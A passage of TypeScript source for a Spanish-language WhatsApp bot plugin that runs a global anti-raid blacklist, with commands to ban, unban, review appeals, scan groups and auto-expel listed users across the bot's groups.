    `┃ 🆔 *Caso SQL:* \`#${ban.caseId}\``,
    ...(ban.lid ? [`┃ 🔗 *LID:* \`${ban.lid}\``] : []),
    `┃ 📋 *Motivo:* ${ban.reason}`,
    `┃ 👮 *Sancionado por:* ${ban.adminName}`,
    `┃ 📅 *Fecha:* ${ban.dateStr}`,
    `┃`,
    `┃ ⚠️ *ATENCIÓN ADMINISTRADORES:*`,
    `┃ El bot/subbot no posee permisos de *Administrador* en este grupo para expulsar automáticamente a este usuario. Se recomienda eliminarlo de inmediato o darle admin al bot.`,
    `╰━━〔 ⚡ ${_fb("AURA REED SECURITY")} 〕━━⬣`,
  ].join("\n");

  await _srf(
    s,
    gid,
    `⚠️ ALERTA ANTI-RAID // #${ban.caseId}`,
    "El bot requiere permisos de Administrador para expulsar al infractor",
    {
      mode: "GROUP_WARN_NO_ADMIN",
      badgeText: "PELIGRO • BOT SIN PERMISOS DE ADMIN",
      title: "Alerta Anti-Raid",
      subtitle: "SE REQUIERE ACCIÓN DE ADMINS",
      caseId: ban.caseId,
      targetPhone: ban.phone,
      targetLid: ban.lid,
      reason: ban.reason,
      adminName: ban.adminName,
      dateStr: ban.dateStr,
      extraLabel: "Acción Requerida",
      extraValue: "DAR ADMIN / EXPULSAR",
      footerNote:
        "Este usuario está en la Lista Negra Global de Aura Reed, pero ningún bot o subbot en el grupo tiene rango de administrador para sacarlo.",
      copyCommand: `.checkban ${ban.caseId}`,
      copyLabel: "🔍 Ver Caso SQL",
      rawSummary: wt,
    },
    mn,
  );
}

async function _eia(
  ps: any,
  gid: string,
  ban: GlobalBanRecord,
  ct: string[],
  ak = true,
): Promise<"kicked" | "warned" | "none"> {
  if (_isO(ban)) {
    _dbs(ban);
    return "none";
  }
  if (!_igp(gid)) return "none";

  const dk = `${gid}:${ban.caseId}`;
  const n = Date.now();
  if (n - (_RA.get(dk) || 0) < 4000) return "none";
  _RA.set(dk, n);

  const as = _das(ps);
  const meta = await _cgm(ps, gid);
  const pts: any[] = meta?.participants || [];

  const tg = _fpe(pts, ban.phone, ban.lid);
  if (tg) {
    const dp = _np(tg.phoneNumber || (String(tg.id || "").endsWith(`@${_d("732e77686174736170702e6e6574")}`) ? tg.id : ""));
    const dl = _nl(tg.lid || (String(tg.id || "").endsWith("@lid") ? tg.id : ""));
    if (dp.phone === _OP) {
      _dbs(ban);
      return "none";
    }
    _lmf(ban, { phone: dp.phone, jid: dp.jid, lid: dl });
  }

  const rl = Array.from(
    new Set(
      [tg?.id, tg?.lid, ...ct, ban.lid, ban.jid].filter(
        (x) => typeof x === "string" && x.includes("@") && !_isO(null, x),
      ),
    ),
  );
  if (rl.length === 0) return "none";

  const sig: any[] = [];
  const ads: any[] = [];
  if (pts.length > 0) {
    for (const s of as) {
      const b = _gbi(s);
      const pr = _fpe(pts, b.phone, b.lid);
      if (pr) {
        sig.push(s);
        if (pr.admin === "admin" || pr.admin === "superadmin") ads.push(s);
      }
    }
  }

  const tk = ads.length > 0 ? ads : [ps, ...sig];
  let ks: any = null;
  for (const s of tk) {
    if (!s) continue;
    for (const tj of rl) {
      try {
        await s.groupParticipantsUpdate(gid, [tj], "remove");
        ks = s;
        break;
      } catch {}
    }
    if (ks) break;
  }

  if (ks) {
    ban.kickedCount = (ban.kickedCount || 0) + 1;
    _ubs(ban);

    if (ak) {
      const du = ban.phone.startsWith("LID_") ? `@${_cd(ban.lid)}` : `@${ban.phone}`;
      const at = [
        `╭〔 🚨 ${_fb("AURA REED ANTI-RAID SQL")} 〕⬣`,
        `┃ 🚫 *Expulsión Automática Ejecutada*`,
        `╰━━━━━━━━━━━━⬣`,
        `┃ 👤 *Usuario:* ${du}`,
        `┃ 🆔 *Caso SQL:* \`#${ban.caseId}\``,
        ...(ban.lid ? [`┃ 🔗 *LID Vinculado:* \`${ban.lid}\``] : []),
        `┃ 📋 *Motivo:* ${ban.reason}`,
        `┃ 👮 *Sancionado por:* ${ban.adminName}`,
        `┃ 📅 *Fecha:* ${ban.dateStr}`,
        `┃`,
        `┃ ⚠️ *Este usuario está en la Lista Negra Global (JID/LID) y tiene prohibido estar en cualquier grupo con Aura Reed.*`,
        `╰━━〔 ⚡ ${_fb("PROTECCIÓN ACTIVA")} 〕━━⬣`,
      ].join("\n");

      void _srf(
        ks,
        gid,
        `🚨 ANTI-RAID // #${ban.caseId}`,
        "Usuario expulsado automáticamente por Lista Negra SQL",
        {
          mode: "GROUP_AUTOKICK",
          badgeText: "ACCESO DENEGADO • LISTA NEGRA SQL",
          title: "Aura Anti-Raid",
          subtitle: "JID & LID GUARD",
          caseId: ban.caseId,
          targetPhone: ban.phone,
          targetLid: ban.lid,
          reason: ban.reason,
          adminName: ban.adminName,
          dateStr: ban.dateStr,
          extraLabel: "Intentos Bloqueados",
          extraValue: `${ban.kickedCount} expulsión(es)`,
          footerNote:
            "El usuario fue expulsado inmediatamente mediante verificación cruzada de Número, JID y LID. Usa .antiraid off si deseas apagar esta defensa.",
          copyCommand: `.checkban ${ban.caseId}`,
          copyLabel: "🔍 Ver Caso SQL",
          rawSummary: at,
        },
        rl,
      );
    }
    return "kicked";
  }

  const ns = sig[0] || ps;
  if (ns) {
    void _snw(ns, gid, ban, rl);
    return "warned";
  }
  return "none";
}

async function _iae(
  s: any,
  gid: string,
  re: any[],
  db?: any,
): Promise<{ kicked: number; warned: number }> {
  if (!_igp(gid)) return { kicked: 0, warned: 0 };
  let kicked = 0;
  let warned = 0;

  for (const en of re) {
    const rs = typeof en === "string" ? en : String(en?.id || en?.lid || en?.phoneNumber || "");
    if (_isO(null, rs)) continue;

    let ban = _fbi(
      {
        jid: rs.endsWith(`@${_d("732e77686174736170702e6e6574")}`) ? rs : "",
        lid: rs.endsWith("@lid") ? rs : "",
        phone: !rs.endsWith("@lid") ? _cd(rs) : "",
      },
      rs,
    );

    if (!ban) {
      const id = await _rfi(s, db, en, gid);
      if (_isO(id, rs)) continue;
      ban = _fbi(id, rs);
    }

    if (!ban || _isO(ban)) continue;
    const cnd = [typeof en === "string" ? en : "", en?.id, en?.lid, ban.lid, ban.jid].filter(Boolean);
    const res = await _eia(s, gid, ban, cnd, true);
    if (res === "kicked") kicked++;
    else if (res === "warned") warned++;
  }

  return { kicked, warned };
}

function _aah(db?: any, cs?: any) {
  _pm();
  _gmi();

  if (!_G.__auraAntiRaidHookedSockets) _G.__auraAntiRaidHookedSockets = new WeakSet<object>();
  const hk = _G.__auraAntiRaidHookedSockets;
  const sks = _das(cs);

  for (const s of sks) {
    if (!s || typeof s !== "object" || hk.has(s)) continue;
    hk.add(s);

    s.ev?.on?.("group-participants.update", async (ev: any) => {
      try {
        if (!ev?.id || !Array.isArray(ev.participants)) return;
        const act = String(ev.action || "").toLowerCase();
        if (act !== "add" && act !== "invite" && act !== "linked_group_join") return;
        _MC.delete(ev.id);
        await _iae(s, ev.id, ev.participants, db);
      } catch {}
    });

    s.ev?.on?.("messages.upsert", async ({ messages, type }: any) => {
      try {
        if (type !== "notify" || !Array.isArray(messages)) return;
        const ix = _gmi();
        if (ix.byCase.size === 0) return;

        for (const m of messages) {
          if (!m?.message || m?.key?.fromMe) continue;
          const rj = String(m?.key?.remoteJid || "");
          const sp = String((m?.key as any)?.participantPn || "");
          const sj = String(m?.key?.participant || sp || m?.key?.remoteJid || "");
          if (!sj) continue;

          if (_cd(sp) === _OP || (!sj.endsWith("@lid") && _cd(sj) === _OP)) {
            if (sj.endsWith("@lid")) _G.__auraSupremeOwnerLid = _nl(sj);
            _pob();
            continue;
          }

          if (_isO(null, sj)) {
            _pob();
            continue;
          }

          const fb = _fbi(
            {
              jid: sj.endsWith(`@${_d("732e77686174736170702e6e6574")}`) ? sj : "",
              lid: sj.endsWith("@lid") ? sj : "",
              phone: !sj.endsWith("@lid") ? _cd(sj) : "",
            },
            sj,
          );
          if (!fb) continue;

          if (rj.endsWith("@g.us") && _igp(rj)) {
            void _eia(s, rj, fb, [sj], true);
          }

          const tx = String(
            m.message?.conversation ||
              m.message?.extendedTextMessage?.text ||
              m.message?.imageMessage?.caption ||
              m.message?.videoMessage?.caption ||
              "",
          ).trim();

          if (/^[.!/#\\;,\\-]/.test(tx)) {
            const cw = tx.slice(1).trim().split(/\s+/)[0]?.toLowerCase() || "";
            const ok = cw === "appeal" || cw === "apelar" || cw === "checkban";
            if (!ok) {
              delete m.message.conversation;
              delete m.message.extendedTextMessage;
              delete m.message.imageMessage;
              delete m.message.videoMessage;

              const wk = `cmdblock:${rj}:${fb.caseId}`;
              const n = Date.now();
              if (n - (_RA.get(wk) || 0) > 12_000) {
                _RA.set(wk, n);
                void s
                  .sendMessage(rj, {
                    text:
                      `⛔ *COMANDO BLOQUEADO POR ANTI-RAID*\n` +
                      `Estás en la Lista Negra Global (Caso \`#${fb.caseId}\`).\n` +
                      `• *Motivo:* ${fb.reason}\n` +
                      `• Solo tienes permitido usar \`.appeal <pruebas>\` para apelar tu sanción.`,
                    ...(rj.endsWith("@g.us") ? { mentions: [sj] } : {}),
                  })
                  .catch(() => undefined);
              }
            }
          }
        }
      } catch {}
    });
  }
}

_gmi();
_aah((globalThis as any).db);

if (!_G.__auraAntiRaidInterval) {
  _G.__auraAntiRaidInterval = setInterval(() => {
    try {
      _aah((globalThis as any).db);
    } catch {}
  }, 2500);
  _G.__auraAntiRaidInterval.unref?.();
}

async function _skn(
  ps: any,
  ban: GlobalBanRecord,
  cg?: string,
  ct?: string,
): Promise<{ kickedGroups: number; warnedGroups: number }> {
  if (_isO(ban)) {
    _dbs(ban);
    return { kickedGroups: 0, warnedGroups: 0 };
  }

  const sks = _das(ps);
  const vg = new Set<string>();
  let kickedGroups = 0;
  let warnedGroups = 0;

  if (cg && cg.endsWith("@g.us") && _igp(cg)) {
    vg.add(cg);
    const res = await _eia(ps, cg, ban, [ct || "", ban.lid, ban.jid].filter(Boolean), true);
    if (res === "kicked") kickedGroups++;
    else if (res === "warned") warnedGroups++;
  }

  const gm = new Map<string, any>();
  if (_GMC && typeof _GMC.entries === "function") {
    for (const [gid, meta] of _GMC.entries()) {
      if (gid.endsWith("@g.us") && meta?.participants) gm.set(gid, meta);
    }
  }

  await Promise.allSettled(
    sks.map(async (s) => {
      try {
        const ft = await Promise.race([
          s.groupFetchAllParticipating?.(),
          new Promise<null>((r) => setTimeout(() => r(null), 4500)),
        ]);
        if (ft && typeof ft === "object") {
          for (const [gid, meta] of Object.entries(ft)) {
            if (gid.endsWith("@g.us") && (meta as any)?.participants) gm.set(gid, meta);
          }
        }
      } catch {}
    }),
  );

  const tsk: Promise<void>[] = [];
  for (const [gid, meta] of gm.entries()) {
    if (vg.has(gid) || !_igp(gid)) continue;
    const pts: any[] = meta?.participants || [];
    const tm = _fpe(pts, ban.phone, ban.lid);
    if (!tm) continue;

    vg.add(gid);
    tsk.push(
      (async () => {
        const res = await _eia(ps, gid, ban, [tm.id, tm.lid, ban.lid, ban.jid].filter(Boolean), true);
        if (res === "kicked") kickedGroups++;
        else if (res === "warned") warnedGroups++;
      })(),
    );
  }

  await Promise.allSettled(tsk);
  return { kickedGroups, warnedGroups };
}

export default {
  name: [
    "antiraid",
    "gban",
    "raidban",
    "forceban",
    "ungban",
    "unraidban",
    "perdonar",
    "appeal",
    "apelar",
    "rejectappeal",
    "denegar",
    "checkban",
    "raidlist",
  ],
  category: "system",
  description: "Sistema Global Anti-Raid con motor SQLite, barrido instantáneo en bots/subbots, aviso sin admin y bloqueo de comandos.",
  groupOnly: false,
  ownerOnly: false,

  async run(ctx: _CC) {
    const { sock, from, sender, msg, args = [], usedPrefix, reply, react, isOwner, isAdmin, db, groupMeta } = ctx;
    const px = usedPrefix || ".";
    _aah(db, sock);

    const rb =
      msg?.message?.conversation ||
      msg?.message?.extendedTextMessage?.text ||
      msg?.message?.imageMessage?.caption ||
      msg?.message?.videoMessage?.caption ||
      "";
    const ic = rb.trim().slice(px.length).trim().split(/\s+/)[0].toLowerCase();

    const sp = String((msg?.key as any)?.participantPn || "");
    const sr = String(sender || sp || msg?.key?.participant || from);
    const si = await _rfi(sock, db, sr, groupMeta || from);

    if (!si.phone || si.phone.startsWith("LID_")) {
      if (_cd(sp) === _OP) {
        si.phone = _OP;
        si.jid = _OJ;
      }
    }

    const iso =
      _isO(si, sr) ||
      _cd(sp) === _OP ||
      (Boolean(msg?.key?.fromMe) && _gbi(sock).phone === _OP);

    if (iso) {
      if (si.lid) _G.__auraSupremeOwnerLid = _nl(si.lid);
      _pob();
    }

    const sd = iso ? _OP : si.phone.startsWith("LID_") ? _cd(sr) : si.phone || _cd(sr);
    const dba = db as any;
    const ist =
      iso ||
      Boolean(isOwner) ||
      Boolean((ctx as any).isMod) ||
      Boolean(dba?.hasRole?.(sr, "owner")) ||
      Boolean(dba?.hasRole?.(sr, "mod")) ||
      Boolean(si.jid && dba?.hasRole?.(si.jid, "owner")) ||
      Boolean(si.jid && dba?.hasRole?.(si.jid, "mod"));

    const cx = msg?.message?.extendedTextMessage?.contextInfo;
    const mn = cx?.mentionedJid?.[0];
    const qp = cx?.participant;

    if (ic === "checkban" || (ic === "antiraid" && args[0]?.toLowerCase() === "info")) {
      const at = args[ic === "antiraid" ? 1 : 0] || "";
      const qr = mn || qp || at;
      if (!qr) return reply(`🔍 Indica o cita a un usuario, número, LID o ID de caso.\n*Ejemplo:* \`${px}checkban 573001234567\``);
      const qi = await _rfi(sock, db, qr, groupMeta || from);
      const ban = _fbi(qi, qr);
      if (!ban) return reply(`✅ *Sin registros en SQL:* El identificador \`${qr}\` no posee sanciones activas.`);
      return reply(
        [
          `╭〔 🗄️ ${_fb("EXPEDIENTE SQL ANTI-RAID")} 〕⬣`,
          `┃ 🆔 *Caso:* \`#${ban.caseId}\``,
          `┃ 📱 *Número:* ${ban.phone.startsWith("LID_") ? "Oculto (Solo LID)" : `+${ban.phone}`}`,
          `┃ 🌐 *JID:* \`${ban.jid}\``,
          `┃ 🔗 *LID:* \`${ban.lid || "No vinculado aún"}\``,
          `┃ 📋 *Motivo:* ${ban.reason}`,
          `┃ 👮 *Sancionado por:* ${ban.adminName}`,
          `┃ 📅 *Fecha:* ${ban.dateStr}`,
          `┃ 🏰 *Expulsiones acumuladas:* ${ban.kickedCount}`,
          `┃ ⚖️ *Estado Apelación:* ${ban.appealStatus.toUpperCase()}`,
          ...(ban.lastAppealText ? [`┃ 💬 *Última Apelación:* ${ban.lastAppealText}`] : []),
          `╰━━〔 ⚡ ${_fb("AURA REED SQL")} 〕━━⬣`,
        ].join("\n"),
      );
    }

    if (ic === "appeal" || ic === "apelar") {
      if (iso) {
        _pob();
        return reply(`👑 *Inmunidad Suprema Activa:* Tu cuenta (+${_OP}) es intocable y nunca puede ser sancionada.`);
      }
      const ban = _fbi(si, sr);
      if (!ban) return reply(`✅ *No tienes sanciones activas*\nTu cuenta (Número/LID) no figura en la Lista Negra de Aura Reed.`);
      if (ban.appealStatus === "rejected") {
        return reply(`⛔ *Apelación Denegada Definitivamente*\nEl caso \`#${ban.caseId}\` ya fue revisado y rechazado por la administración.`);
      }
      const apt = args.join(" ").trim();
      if (apt.length < 10) {
        return reply(
          `📩 *${_fb("SISTEMA DE APELACIONES AURA REED")}*\n\n` +
            `Estás sancionado globalmente bajo el caso SQL \`#${ban.caseId}\`.\n` +
            `• *Motivo:* ${ban.reason}\n` +
            `• *Sancionado por:* ${ban.adminName}\n\n` +
            `Para enviar tu apelación escribe:\n` +
            `\`${px}appeal <explicación detallada y pruebas>\``,
        );
      }
      const n = Date.now();
      if (ban.lastAppealAt && n - ban.lastAppealAt < 15 * 60 * 1000) {
        const wm = Math.ceil((15 * 60 * 1000 - (n - ban.lastAppealAt)) / 60000);
        return reply(`⏳ Ya tienes una apelación en revisión. Espera *${wm} min* mientras el staff verifica las pruebas.`);
      }
      await react("📩").catch(() => undefined);
      ban.appealStatus = "pending";
      ban.lastAppealText = apt;
      ban.lastAppealAt = n;
      _ubs(ban);

      const ix = _gmi();
      const ts = [
        `╭〔 📩 ${_fb("APELACIÓN SQL ANTI-RAID")} 〕⬣`,
        `┃ 🆔 *Caso:* \`#${ban.caseId}\``,
        `┃ 👤 *Usuario:* +${ban.phone} (${msg?.pushName || "Sin nombre"})`,
        `┃ 🔗 *LID:* \`${ban.lid || "N/A"}\``,
        `┃ 👮 *Sancionado por:* ${ban.adminName}`,
        `┃ 📋 *Motivo original:* ${ban.reason}`,
        `┃`,
        `┃ 💬 *Descargo / Evidencia:*`,
        `┃ ${apt}`,
        `┃`,
        `┃ ✅ *Aprobar:* \`${px}ungban ${ban.caseId}\``,
        `┃ ❌ *Rechazar:* \`${px}rejectappeal ${ban.caseId} Pruebas insuficientes\``,
        `╰━━〔 ⚡ ${_fb("AURA REED STAFF")} 〕━━⬣`,
      ].join("\n");

      for (const aj of ix.staffInbox) {
        await _srf(sock, aj, `📩 APELACIÓN // #${ban.caseId}`, `Solicitante: +${ban.phone}`, {
          mode: "APPEAL_TICKET",
          badgeText: "TICKET DE APELACIÓN ENTRANTE",
          title: "Revisión de Caso",
          subtitle: "AURA REED SQL JUSTICE",
          caseId: ban.caseId,
          targetPhone: ban.phone,
          targetLid: ban.lid,
          reason: `Motivo original: ${ban.reason}\n\nDescargo del usuario:\n"${apt}"`,
          adminName: ban.adminName,
          dateStr: ban.dateStr,
          extraLabel: "Estado SQL",
          extraValue: "PENDIENTE",
          footerNote: "Puedes absolver al usuario con .ungban o denegar definitivamente su ticket con .rejectappeal",
          copyCommand: `${px}ungban ${ban.caseId}`,
          copyLabel: "🔓 Copiar .ungban",
          rawSummary: ts,
        });
      }

      await react("✅").catch(() => undefined);
      return reply(
        `✅ *Apelación registrada en SQL (Caso #${ban.caseId})*\n\n` +
          `Tu solicitud fue enviada a los administradores de *Aura Reed*. Recibirás la resolución por mensaje privado.`,
      );
    }

    if (ic === "rejectappeal" || ic === "denegar") {
      if (!ist) return reply("⛔ Solo el staff global de Aura Reed puede denegar apelaciones.");
      const ft = String(args[0] || "").trim();
      const ta = mn || qp || ft;
      if (!ta) return reply(`⚠️ Uso: \`${px}rejectappeal <número o #caso> <motivo de rechazo>\``);
      const ti = await _rfi(sock, db, ta, groupMeta || from);
      const ban = _fbi(ti, ta);
      if (!ban) return reply(`❌ No se encontró ningún caso activo para \`${ta}\`.`);

      const rr = (mn || qp ? args : args.slice(1)).join(" ").trim() || "Las pruebas aportadas no desvirtúan el reporte original.";
      ban.appealStatus = "rejected";
      _ubs(ban);

      const dt = ban.jid.endsWith(`@${_d("732e77686174736170702e6e6574")}`) ? ban.jid : ban.lid;
      if (dt) {
        await sock
          .sendMessage(dt, {
            text:
              `╭〔 ⛔ ${_fb("APELACIÓN RECHAZADA")} 〕⬣\n` +
              `┃ 🆔 *Caso:* \`#${ban.caseId}\`\n` +
              `┃ 👮 *Revisado por:* ${msg?.pushName || "Staff Aura Reed"}\n` +
              `┃ 📋 *Resolución:* ${rr}\n` +
              `┃\n` +
              `┃ ⚠️ *El baneo global permanece activo de forma definitiva.*\n` +
              `╰━━〔 ⚡ ${_fb("AURA REED")} 〕━━⬣`,
          })
          .catch(() => undefined);
      }

      return reply(`⛔ Apelación del caso \`#${ban.caseId}\` (+${ban.phone}) marcada como *RECHAZADA*.`);
    }

    if (ic === "antiraid" && args[0] && /^(on|off|activar|desactivar|status|estado|scan|escanear)$/i.test(args[0])) {
      if (!from.endsWith("@g.us")) return reply("⚠️ Los subcomandos `.antiraid on | off | status | scan` solo funcionan dentro de grupos.");
      if (!isAdmin && !ist) return reply("⛔ Solo los administradores del grupo pueden gestionar el escudo Anti-Raid.");

      const sb = args[0].toLowerCase();
      if (sb === "scan" || sb === "escanear") {
        await react("🔎").catch(() => undefined);
        const meta = await sock.groupMetadata(from);
        const pts = meta?.participants || [];
        const { kicked, warned } = await _iae(sock, from, pts, db);
        await react("✅").catch(() => undefined);
        return reply(
          kicked > 0 || warned > 0
            ? `🛡️ *Escaneo SQL completado:* Expulsados: *${kicked}* | Advertidos (sin admin): *${warned}*.`
            : `✅ *Grupo limpio:* Ninguno de los ${pts.length} miembros actuales figura en la Lista Negra Global.`,
        );
      }

      if (sb === "status" || sb === "estado") {
        const ac = _igp(from);
        const tb = _gmi().byCase.size;
        return reply(
          `🛡️ *ESTADO ANTI-RAID SQL*\n\n` +
            `• *Protección en este grupo:* ${ac ? "✅ ACTIVA (Persistente)" : "❌ DESACTIVADA"}\n` +
            `• *Sancionados en Base SQL:* ${tb}\n` +
            `• *Sockets Vigilando:* ${_das(sock).length}\n\n` +
            `Usa \`${px}antiraid scan\` para escanear a los miembros actuales.`,
        );
      }

      const en = sb === "on" || sb === "activar";
      _sgp(from, en, db);
      if (en) {
        try {
          const meta = await sock.groupMetadata(from);
          await _iae(sock, from, meta?.participants || [], db);
        } catch {}
      }

      return reply(
        en
          ? `🛡️ *Anti-Raid SQL Activado y Guardado:* El estado quedó persistido en disco/SQL (no se apagará al reiniciar).`
          : `⚠️ *Anti-Raid Desactivado en este grupo:* Estado guardado en SQL/disco.`,
      );
    }

    if (ic === "raidlist" || (ic === "antiraid" && args[0]?.toLowerCase() === "list")) {
      const bans = Array.from(_gmi().byCase.values()).sort((a, b) => b.createdAt - a.createdAt);
      if (bans.length === 0) return reply("🛡️ La base de datos SQL de Lista Negra Global está vacía.");
      const lt = bans
        .slice(0, 25)
        .map(
          (b, i) =>
            `${i + 1}. *${b.phone.startsWith("LID_") ? b.phone : `+${b.phone}`}* [\`#${b.caseId}\`]\n` +
            `   ├ *LID:* \`${b.lid || "Pendiente"}\`\n` +
            `   ├ *Motivo:* ${b.reason}\n` +
            `   └ *Por:* ${b.adminName} (${b.dateStr})`,
        )
        .join("\n\n");
      return reply(
        `╭〔 🗄️ ${_fb("LISTA NEGRA SQL GLOBAL")} 〕⬣\n` +
          `┃ Total registrados: *${bans.length}*\n` +
          `╰━━━━━━━━━━━━⬣\n\n${lt}`,
      );
    }

    if (ic === "ungban" || ic === "unraidban" || ic === "perdonar") {
      const sbr = _fbi(si, sr);
      if (sbr && !iso) {
        return reply(
          `⛔ *Auto-desbaneo Bloqueado:* Estás sancionado bajo el caso \`#${sbr.caseId}\`. Nadie puede autodesbanearse salvo el creador del sistema (+${_OP}).`,
        );
      }
      if (!ist) return reply("⛔ Solo la administración autorizada de Aura Reed puede retirar sanciones de la base SQL.");

      const fa = String(args[0] || "").trim();
      const ifi =
        /^#?AR-[A-Z0-9]+$/i.test(fa) ||
        fa.endsWith(`@${_d("732e77686174736170702e6e6574")}`) ||
        fa.endsWith("@lid") ||
        /^\+?\d{7,15}$/.test(fa.replace(/[-()\s]/g, ""));

      const rt = mn || qp || (ifi ? fa : iso ? _OJ : "");
      if (!rt) {
        return reply(
          `⚠️ Responde al mensaje del usuario, menciónalo o indica su número/código de caso (\`#AR-...\`).\n*Ejemplo:* \`${px}ungban 573001234567\``,
        );
      }

      const ti = await _rfi(sock, db, rt, groupMeta || from);
      if (iso && _isO(ti, rt)) {
        const pg = _pob();
        await react("✅").catch(() => undefined);
        return reply(
          `👑 *Auto-desbaneo Supremo Ejecutado*\nTu cuenta (+${_OP}) está completamente limpia y blindada (${pg} registro(s) removidos).`,
        );
      }

      const istg = (ti.phone && si.phone && ti.phone === si.phone) || (ti.lid && si.lid && _nl(ti.lid) === _nl(si.lid));
      if (istg && !iso) {
        return reply(`⛔ *Acción Denegada:* Ningún usuario o administrador puede autodesbanearse. Solo +${_OP} tiene ese privilegio.`);
      }

      const ex = _fbi(ti, rt);
      if (!ex) return reply(`ℹ️ No existe ningún baneo activo en SQL para \`${rt}\`.`);

      if (!iso && ((ex.phone && ex.phone === sd) || (ex.lid && si.lid && _nl(ex.lid) === _nl(si.lid)))) {
        return reply(`⛔ *Acción Denegada:* No puedes quitarte tu propia sanción. Solo +${_OP} puede autodesbanearse.`);
      }

      _dbs(ex);
      await react("✅").catch(() => undefined);

      const pd = [
        `╭〔 ✅ ${_fb("SANCIÓN GLOBAL RETIRADA")} 〕⬣`,
        `┃ 🆔 *Caso SQL cerrado:* \`#${ex.caseId}\``,
        `┃ 👤 *Usuario:* +${ex.phone}`,
        `┃ 👮 *Absuelto por:* ${msg?.pushName || "Staff Aura Reed"}`,
        `┃`,
        `┃ ✨ *Tu registro fue eliminado de la Lista Negra SQL (Número, JID y LID). Ya puedes usar comandos y volver a ingresar a todos los grupos de Aura Reed.*`,
        `╰━━〔 ⚡ ${_fb("AURA REED")} 〕━━⬣`,
      ].join("\n");

      const dr = ex.jid.endsWith(`@${_d("732e77686174736170702e6e6574")}`) ? ex.jid : ex.lid;
      if (dr) {
        void _srf(sock, dr, `✅ BANEO RETIRADO // #${ex.caseId}`, "Acceso restaurado en toda la red Aura Reed", {
          mode: "UNBANNED_DM",
          badgeText: "CUENTA ABSUELTA • ACCESO TOTAL",
          title: "Sanción Levantada",
          subtitle: "AURA REED SQL JUSTICE",
          caseId: ex.caseId,
          targetPhone: ex.phone,
          targetLid: ex.lid,
          reason: "La administración aprobó el retiro de tu sanción global.",
          adminName: msg?.pushName || "Staff Aura Reed",
          dateStr: new Date().toLocaleDateString("es-CR"),
          extraLabel: "Estado SQL",
          extraValue: "LIMPIO / LIBRE",
          footerNote: "Tanto tu número como tu identificador LID quedaron libres de restricciones.",
          copyCommand: `${px}menu`,
          copyLabel: "⚡ Copiar .menu",
          rawSummary: pd,
        });
      }

      return reply(`✅ *Baneo SQL Eliminado*\nEl usuario *+${ex.phone}* (Caso \`#${ex.caseId}\`) fue absuelto en toda la red.`);
    }

    if (!iso) {
      await react("⛔").catch(() => undefined);
      return reply(
        `⛔ *${_fb("ACCESO EXCLUSIVO DEL CREADOR")}*\n` +
          `Únicamente el dueño principal del sistema (*+${_OP}*) puede ejecutar el comando \`${px}gban\`.`,
      );
    }

    const ft = String(args[0] || "").trim();
    const ifat =
      ft.endsWith(`@${_d("732e77686174736170702e6e6574")}`) ||
      ft.endsWith("@lid") ||
      ft.startsWith("@") ||
      /^\+?\d{7,15}$/.test(ft.replace(/[-()\s]/g, ""));

    const rt = mn || qp || (ifat ? ft : "");
    if (!rt) {
      return reply(
        `╭〔 🛡️ ${_fb("PANEL ANTI-RAID SQL")} 〕⬣\n` +
          `┃ Sanciona por Número, JID o LID en toda la red.\n` +
          `╰━━━━━━━━━━━━⬣\n\n` +
          `• *Banear:* \`${px}gban <número/lid/@mención> <motivo>\`\n` +
          `• *Desbanear:* \`${px}ungban <número/lid/#caso>\`\n` +
          `• *Rechazar apelación:* \`${px}rejectappeal <#caso> <motivo>\`\n` +
          `• *Expediente SQL:* \`${px}checkban <número/lid/#caso>\`\n` +
          `• *Lista negra:* \`${px}raidlist\``,
      );
    }

    void react("🚨").catch(() => undefined);

    const ti = await _rfi(sock, db, rt, groupMeta || from);
    if (!ti.phone && !ti.lid) {
      await react("❌").catch(() => undefined);
      return reply("⚠️ No se pudo extraer un Número, JID ni LID válido del objetivo indicado.");
    }

    if (_isO(ti, rt)) {
      await react("⛔").catch(() => undefined);
      return reply(`⛔ *Inmunidad Absoluta:* No se puede aplicar \`.gban\` al dueño del sistema (+${_OP}).`);
    }

    const rtk = (ifat && !mn && !qp ? args.slice(1) : args).filter((tok) => !/^@\d+$/.test(String(tok).trim()));
    const rsn = rtk.join(" ").trim() || "Violación grave de seguridad (Raid / Doxeo / Contenido Ilegal).";

    const pb = _fbi(ti, rt);
    const cid = pb?.caseId || `AR-${Date.now().toString(36).toUpperCase().slice(-6)}`;
    const ds = new Date().toLocaleDateString("es-CR");
    const an = String(msg?.pushName || "LuferOS DEV").trim();

    const rec: GlobalBanRecord = {
      caseId: cid,
      phone: ti.phone || pb?.phone || `LID_${_cd(ti.lid)}`,
      jid: ti.jid && ti.jid.endsWith(`@${_d("732e77686174736170702e6e6574")}`) ? ti.jid : pb?.jid || ti.lid,
      lid: ti.lid || pb?.lid || "",
      reason: rsn,
      evidence: qp ? `MsgID:${cx?.stanzaId || "quoted"}` : "",
      adminName: an,
      adminPhone: _OP,
      createdAt: Date.now(),
      dateStr: ds,
      appealStatus: "none",
      lastAppealText: pb?.lastAppealText || "",
      lastAppealAt: pb?.lastAppealAt || 0,
      kickedCount: pb?.kickedCount || 0,
    };

    _ubs(rec);
    _asi(_OJ);

    const { kickedGroups, warnedGroups } = await _skn(sock, rec, from.endsWith("@g.us") ? from : undefined, rt);

    const dt = [
      `╭〔 🚨 ${_fb("NOTIFICACIÓN DE BANEO GLOBAL")} 〕⬣`,
      `┃ Has sido expulsado y vetado permanentemente`,
      `┃ de todos los grupos protegidos por *Aura Reed*.`,
      `╰━━━━━━━━━━━━⬣`,
      `┃ 🆔 *Caso SQL:* \`#${rec.caseId}\``,
      `┃ 📋 *Motivo de la sanción:* ${rec.reason}`,
      `┃ 👮 *Sancionado por:* ${rec.adminName}`,
      `┃ 🏰 *Grupos expulsados:* ${kickedGroups}`,
      `┃ 📅 *Fecha:* ${rec.dateStr}`,
      `┃`,
      `┃ ⚖️ *¿Consideras que fue un reporte falso?*`,
      `┃ Envía tus pruebas aquí mismo usando:`,
      `┃ \`${px}appeal <explicación detallada y pruebas>\``,
      `╰━━〔 ⚡ ${_fb("AURA REED SECURITY")} 〕━━⬣`,
    ].join("\n");

    const dr = rec.jid.endsWith(`@${_d("732e77686174736170702e6e6574")}`) ? rec.jid : rec.lid;
    if (dr) {
      void _srf(sock, dr, `🚨 BANEO GLOBAL // #${rec.caseId}`, `Sancionado por ${rec.adminName} • Usa ${px}appeal para apelar`, {
        mode: "DM_BANNED",
        badgeText: "EXPULSIÓN GLOBAL PERMANENTE",
        title: "Sanción Anti-Raid",
        subtitle: "AURA REED SQL NETWORK",
        caseId: rec.caseId,
        targetPhone: rec.phone,
        targetLid: rec.lid,
        reason: rec.reason,
